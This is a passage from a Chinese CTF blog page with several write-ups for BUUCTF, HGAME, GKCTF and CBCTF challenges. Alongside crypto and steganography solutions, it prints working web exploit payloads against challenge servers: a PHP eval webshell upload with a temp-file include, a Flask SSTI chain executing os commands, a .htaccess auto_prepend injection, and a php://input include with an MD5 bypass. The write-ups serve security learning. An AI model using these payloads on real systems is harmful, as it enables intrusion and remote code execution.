<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line">file_data=&#123;</span><br><span class="line">	&#x27;file&#x27;: BytesIO(&quot;&lt;?php eval($_POST[cmd]);&quot;)</span><br><span class="line">&#125;</span><br><span class="line">url=&quot;http://d25d00be-1f7f-4fe4-872c-c951e304b522.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="line">try:</span><br><span class="line">	r=requests.post(url=url,files=file_data,allow_redirects=False)</span><br><span class="line">except:</span><br><span class="line">        print(1)</span><br></pre></td></tr></table></figure>
<p>查看临时文件夹dir.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;phpwQsgxe&quot; &#125; </span><br></pre></td></tr></table></figure>
<p>成功写入<br>通过tmp临时文件下利用file进行包含</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://5a5dd8e2-0b88-4f11-a159-48159217daea.node4.buuoj.cn:81/flflflflag.php?file=/tmp/phpwQsgxe</span><br><span class="line"></span><br><span class="line">cmd=phpinfo();</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;FLAG &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;flag&#123;c78a4c19-ceac-458c-86b8-40dbe83b5a41&#125; &lt;/td&gt;&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP_VERSION &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/01/2022-3-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/01/2022-3-1/" class="post-title-link" itemprop="url">2022.3.1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-01 08:30:35" itemprop="dateCreated datePublished" datetime="2022-03-01T08:30:35+08:00">2022-03-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-02 18:00:14" itemprop="dateModified" datetime="2022-03-02T18:00:14+08:00">2022-03-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="HGAME"><a href="#HGAME" class="headerlink" title="HGAME"></a>HGAME</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="秋名山车神-http头"><a href="#秋名山车神-http头" class="headerlink" title="秋名山车神-http头"></a>秋名山车神-http头</h4><p>抓包查看请求头，发现一个自定义的值<code>gasoline</code>，推断这是一道http请求头修改的题目</p>
<ul>
<li>referer: qiumingshan.net</li>
<li>user-agent:Hachi-Roku</li>
<li>flavor:Raspberry</li>
<li>gasoline:100</li>
<li>X-Real-ip:127.0.0.1 <em>不同的代理服务器可以使用不同的请求头，<code> gin-gonic/gin</code>框架可以使用XFF和XRI</em></li>
</ul>
<h4 id="蜘蛛头"><a href="#蜘蛛头" class="headerlink" title="蜘蛛头"></a>蜘蛛头</h4><p>通往下一关的链接在一个数量递增的按钮块里，但查看元素后发现跳转网址只有一个，所以理论上可以直接f12一个个点过去，由于担心出题人整活就写了脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/71bb101faf&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span>():</span></span><br><span class="line">    count=<span class="number">1</span></span><br><span class="line">f1=foo()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethtml</span>(<span class="params">url1</span>):</span></span><br><span class="line">    key=<span class="string">&#x27;&#x27;</span> </span><br><span class="line">    f1.count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(f1.count&gt;<span class="number">102</span>):</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    page=requests.get(url1)</span><br><span class="line">    <span class="built_in">print</span>(page.text)</span><br><span class="line">    key=re.findall(<span class="string">&#x27;\?key=.+3D&#x27;</span>,page.text)</span><br><span class="line">    <span class="comment">#key=key[10:20]</span></span><br><span class="line">    <span class="built_in">print</span>(url1)</span><br><span class="line">    url1=url+<span class="built_in">str</span>(key)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">    gethtml(url1)</span><br><span class="line">gethtml(url)</span><br></pre></td></tr></table></figure>
<p>最后总共一百层，还好</p>
<h4 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h4><p>又是喜闻乐见的小游戏时间<br>直接<code>ctrl</code>+<code>F</code>搜索score<br>结果查到一串jsfuck代码，放进浏览器控制台里跑一下就出结果了</p>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="麻烦的压缩包"><a href="#麻烦的压缩包" class="headerlink" title="麻烦的压缩包"></a>麻烦的压缩包</h4><ol>
<li>加密的压缩包，查看属性存在注释</li>
<li>暴力破解6位密码<code>483279</code></li>
<li>获得密码本，使用字典攻击</li>
<li>提示未压缩的压缩包，使用crc明文攻击</li>
<li>binwalk3分析<code>flag.jpg</code>,得到最后一个压缩包</li>
<li>伪加密修开判定hex值，打开获得flag</li>
</ol>
<h4 id="好康的流量"><a href="#好康的流量" class="headerlink" title="好康的流量"></a>好康的流量</h4><p>使用<code>wireshark</code>将流量文件导出为<code>smb</code>对象<br>放入<code>stegsolve</code>中得到条形码，扫描获得先半段flag<br><code>lsb</code>中选择RGB的0位获得后半段。</p>
<h2 id="buuctf-rsa1"><a href="#buuctf-rsa1" class="headerlink" title="buuctf_rsa1"></a>buuctf_rsa1</h2><p>RSA中已知dq，dp的计算m步骤<code>（dp=dmod(p-1),dq=dmod(q-1)）</code>：</p>
<ul>
<li>计算q模p的逆元I;</li>
<li>计算m1=(c^dp)modp;</li>
<li>计算m2=(c^dq)modq;</li>
<li>m=(((m1-m2)*I)modp)*q+m2;<br>解题脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c,dq,q)</span><br><span class="line">m = (((m1-m2)*I)%p)*q+m2</span><br><span class="line"><span class="built_in">print</span>(m)                               </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))                      </span><br></pre></td></tr></table></figure>
<h2 id="BUUCTF-ssti"><a href="#BUUCTF-ssti" class="headerlink" title="BUUCTF_ssti"></a>BUUCTF_ssti</h2><p>flask框架存在的服务端污染漏洞<br>测试ssti位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;9*9&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到<code>HELLO 81</code><br>证实存在ssti<br>寻找可用子类<br>先用<code>__class__</code>先找到’’的类<br>用<code>__bases__</code>找到他的基类<br><code>subclass()</code>找到子类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><em>一是file模块中的read功能，用来读取各种文件，敏感信息等。但是在<br>二是warnings.catch_warnings(需自己导入os模块)、socket._socketobject(需自己导入os模块)、site._Printer、site.Quitter等模块的内置os，通过os模块我们可以做到system执行命令（system执行成功返回0，不会在页面显示。）、popen管道读取文件、listdir列目录等操作。<br>三是get_flashed_messages() 获取闪现信息</em><br>寻找所需子类的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>():</span></span><br><span class="line">    <span class="built_in">list</span> = <span class="string">&quot;&quot;</span> <span class="comment">#HTML</span></span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;class &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;enum &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;type &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line">    className = <span class="string">&#x27;warnings.catch_warnings&#x27;</span> <span class="comment">#需要查找的模块名称</span></span><br><span class="line">    num = <span class="built_in">list</span>.index(className)</span><br><span class="line">    <span class="built_in">print</span>(num) <span class="comment">#返回索引</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    find()</span><br></pre></td></tr></table></figure>
<p>得到：<code>166</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:25700/?name=&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27env%27).read()%22)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到环境变量中的flag值。</p>
<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对上传内容和文件名进行了过滤<br>使用<code>file_put_content</code>写入木马，通过<code>.hatccess</code>绕过。但成功一次后直接报错500<br>写入<code>#&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;&#39;);?&gt;</code><br>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?php%20system(&#x27;cat%20/fla&#x27;.&#x27;g&#x27;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>
<p>成功得到flag，打错一次后就一直500报错，试错成本有点高</p>
<h2 id="GKCTF-2021-你知道apng吗"><a href="#GKCTF-2021-你知道apng吗" class="headerlink" title="[GKCTF 2021]你知道apng吗"></a>[GKCTF 2021]你知道apng吗</h2><p>apng是png的动图格式<br>通过apng-db_j51分解图片，得到4张带二维码的图片</p>
<ul>
<li>1号图片通过ps将其拉升回正常比例</li>
<li>2号图片通过steg切换到黑白</li>
<li>3，4正常扫描。</li>
</ul>
<p>获得完全体flag<br><em>apng作为小众的图片格式还能通过delay进行消息隐写</em></p>
<h2 id="GKCTF-2021-excel-骚操作"><a href="#GKCTF-2021-excel-骚操作" class="headerlink" title="GKCTF 2021]excel 骚操作"></a>GKCTF 2021]excel 骚操作</h2><p><em>奇怪的知识点增加了</em><br>查看注释，啥也没有<br>走了一遍英协压缩的流程啥也没有<br>突然想到题目，可能是对单元格操作。<br>点到一看出现了个<code>1</code><br>将单元格格式改为常规，数字就出现了<br>感觉单元格组成了一个图案，将所有的1替换为黑色背景，出现了一个二维码的类似物<br>QR扫描失败，上网查询后得知是汉信码。找到专业工具后解码获得flag<br>汉信码百度：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由中国物品编码中心完成的国家“十五”重大科技专项——《二维条码新码制开发与关键技术标准研究》取得了突破性成果，研究成果包括：研究开发汉信码新码制、开发汉信码生成软件、开发汉信码识读技术及算法、汉信码硬件设备研发、汉信码装备研制、汉信码通讯技术研发以及编制汉信码国家标准等的系列工作。</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/27/CBCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/27/CBCTF/" class="post-title-link" itemprop="url">CBCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-12-27 11:10:15 / 修改时间：15:39:32" itemprop="dateCreated datePublished" datetime="2021-12-27T11:10:15+08:00">2021-12-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CBCTF！！"><a href="#CBCTF！！" class="headerlink" title="CBCTF！！"></a>CBCTF！！</h1><p>哪怕拿不到奖品，也要玩的开心</p>
<h2 id="web1-sign-in"><a href="#web1-sign-in" class="headerlink" title="web1-sign_in"></a>web1-sign_in</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]&gt;<span class="number">2021</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) || is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">exit</span>(<span class="string">&#x27;Please,dont give me array !&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]!=<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])==md5(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">exit</span>(<span class="string">&quot;就差最后一点哦&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&quot;please,get c and d !&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;a is too small&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;a can not be a number!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;please,get a !&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数字和字符结合绕过a<br>c，dMD5<code>0e</code>绕过<br>e include文件包含漏洞<br>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://signin.0rays.club:41001/?a=2022a&amp;c=240610708&amp;d=s878926199a&amp;e=php://input</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&#x27;action&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">$arg = $_GET[&#x27;arg&#x27;] ?? &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&#x27;&#x27;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>字符fuzz出baypass的特殊url字符：<code>%5c</code><br>通过拼接构造函数，写入一句话木马，antsword链接<br>PAYLOAD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=\create_function&amp;arg=return&quot;2333&quot;;&#125;var_dump(scandir(&#x27;./&#x27;));/*</span><br></pre></td></tr></table></figure>
<h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC 1"></a>MISC 1</h2><p>放入虚拟机，自动识别为压缩包<br>解压，<br>备注中发现压缩包密码提示，<br>字符掩码攻击<br>得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0RAYSismyfavorit3t34m</span><br></pre></td></tr></table></figure>
<p>得到图片<code>来上班.png（改成老色比会不会好点）</code><br>应该是lsb隐写，使用stegsolve查看<br>在red0通道隐写了flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">666c61677b613037 66326163352d3837  flag&#123;a07 f2ac5-87</span><br><span class="line">34392d343765612d 623436622d316261  49-47ea- b46b-1ba</span><br><span class="line">3938643635383935 637df1853bfffc00  98d65895 c&#125;..;...</span><br><span class="line">000db212e16a69a4 9fff80c0801b1488  .....ji. ........</span><br></pre></td></tr></table></figure>
<h2 id="未完成题目"><a href="#未完成题目" class="headerlink" title="未完成题目"></a>未完成题目</h2><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>png高度问题<br>发现摩斯电码<br>解码后得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h o - o - o - o - o - o r s e ? m o - o - o - o r s e ! </span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/14/XSS-travel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
